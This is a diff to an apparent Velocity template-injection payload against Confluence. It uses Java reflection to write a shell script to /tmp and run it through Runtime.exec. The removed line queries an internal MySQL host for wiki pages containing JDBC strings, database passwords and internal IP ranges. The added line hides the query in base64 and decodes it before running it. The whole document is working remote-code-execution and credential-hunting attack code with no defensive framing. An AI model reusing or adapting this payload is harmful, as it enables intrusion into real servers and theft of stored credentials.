@@ -1,6 +1,6 @@
 #set($x = "")
 #set($fw = $x.getClass().forName("java.io.FileWriter").getConstructor($x.getClass().forName("java.lang.String")).newInstance("/tmp/zz_cmd.sh"))
-$fw.write("echo ===HIT_JDBC; mysql -h10.18.19.53 -D confluence -N -e 'SELECT c.CONTENTID, c.TITLE, c.LASTMODDATE FROM CONTENT c JOIN BODYCONTENT b ON b.CONTENTID=c.CONTENTID WHERE b.BODY LIKE %jdbc:mysql% GROUP BY c.CONTENTID ORDER BY c.LASTMODDATE DESC LIMIT 30;' 2>&1; echo ===HIT_DBPWD; mysql -h10.18.19.53 -D confluence -N -e 'SELECT c.CONTENTID, c.TITLE, c.LASTMODDATE FROM CONTENT c JOIN BODYCONTENT b ON b.CONTENTID=c.CONTENTID WHERE b.BODY LIKE %数据库密码% OR b.BODY LIKE %DB_PASSWORD% OR b.BODY LIKE %mysql -u% GROUP BY c.CONTENTID ORDER BY c.LASTMODDATE DESC LIMIT 30;' 2>&1; echo ===HIT_IP; mysql -h10.18.19.53 -D confluence -N -e 'SELECT c.CONTENTID, c.TITLE, c.LASTMODDATE FROM CONTENT c JOIN BODYCONTENT b ON b.CONTENTID=c.CONTENTID WHERE b.BODY LIKE %10.18.19% OR b.BODY LIKE %10.18.21% GROUP BY c.CONTENTID ORDER BY c.LASTMODDATE DESC LIMIT 30;' 2>&1; echo Q10_DONE")
+$fw.write("echo U0VMRUNUIGMuQ09OVEVOVElELCBjLlRJVExFLCBjLkxBU1RNT0REQVRFIEZST00gQ09OVEVOVCBjIEpPSU4gQk9EWUNPTlRFTlQgYiBPTiBiLkNPTlRFTlRJRD1jLkNPTlRFTlRJRCBXSEVSRSBiLkJPRFkgTElLRSAnJWpkYmM6bXlzcWwlJyBHUk9VUCBCWSBjLkNPTlRFTlRJRCBPUkRFUiBCWSBjLkxBU1RNT0REQVRFIERFU0MgTElNSVQgMzA7 | base64 -d > /tmp/q.sql; mysql -h10.18.19.53 -D confluence -N < /tmp/q.sql 2>&1; echo Q_DONE")
 $fw.close()
 #set($rt = $x.getClass().forName("java.lang.Runtime").getDeclaredMethod("getRuntime").invoke(null))
 #set($p = $rt.exec("/bin/bash /tmp/zz_cmd.sh"))
